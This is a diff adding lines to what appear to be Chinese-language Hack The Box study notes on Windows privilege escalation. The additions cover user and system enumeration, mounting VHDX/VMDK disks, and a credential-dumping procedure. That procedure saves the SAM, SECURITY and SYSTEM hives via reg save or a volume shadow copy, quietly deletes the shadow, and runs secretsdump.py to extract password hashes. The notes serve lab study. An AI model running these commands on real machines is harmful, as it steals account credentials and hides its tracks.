@@ -320,4 +320,37 @@ OR PS
 C:\htb> Get-ScheduledTask | select TaskName,State
         https://learn.microsoft.com/en-us/powershell/module/scheduledtasks/get-scheduledtask?view=windowsserver2019-ps
 
+
 C:\htb> .\accesschk64.exe /accepteula -s -d C:\Scripts\                使用微软 Sysinternals 官方经典工具 AccessChk（这里是 64 位版本 accesschk64.exe）来递归检查指定目录权限
+
+
+C:\htb> Get-LocalUser                枚举用户
+C:\htb> Get-WmiObject -Class Win32_OperatingSystem | select Description                枚举计算机描述
+
+
+三种特别值得关注的文件类型：
+.vhd        虚拟硬盘 (Virtual Hard Disk)（由 Hyper-V 使用                guestmount --add WEBSRV10.vhdx  --ro /mnt/vhdx/ -m /dev/sda1        在 Linux 上挂载 VHD/VHDX
+.vhdx       虚拟硬盘 v2 (Virtual Hard Disk v2)（由 Hyper-V 使用
+.vmdk       虚拟机磁盘 (Virtual Machine Disk)（由 VMware 使用            guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk                在 Linux 上挂载 VMDK
+
+Snaffler 可以帮助我们进行手动无法完成的彻底枚举        https://github.com/SnaffCon/Snaffler
+
+甚至可以使用 7-Zip 从 .vmdk 文件中提取数据
+
+访问 C:\Windows\System32\Config，拉取 SAM、SECURITY 和 SYSTEM 注册表配置单元 (registry hives)
+SYSTEM包含注册表解密密钥（BootKey / SysKey
+SAM包含本地用户账号的密码哈希（NTLM Hash），如本地 Administrator
+SECURITY包含 LSA Secrets（如 DPAPI 主密钥、服务账号密码、已存的域凭据等）
+
+reg save HKLM\SAM C:\Temp\hives\SAM
+reg save HKLM\SECURITY C:\Temp\hives\SECURITY
+reg save HKLM\SYSTEM C:\Temp\hives\SYSTEM
+OR
+vssadmin create shadow /for=C:
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Temp\SAM
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY C:\Temp\SECURITY
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\SYSTEM
+vssadmin delete shadows /for=C: /quiet
+
+使用像 secretsdump 工具来提取本地用户的密码哈希 (password hashes)
+secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
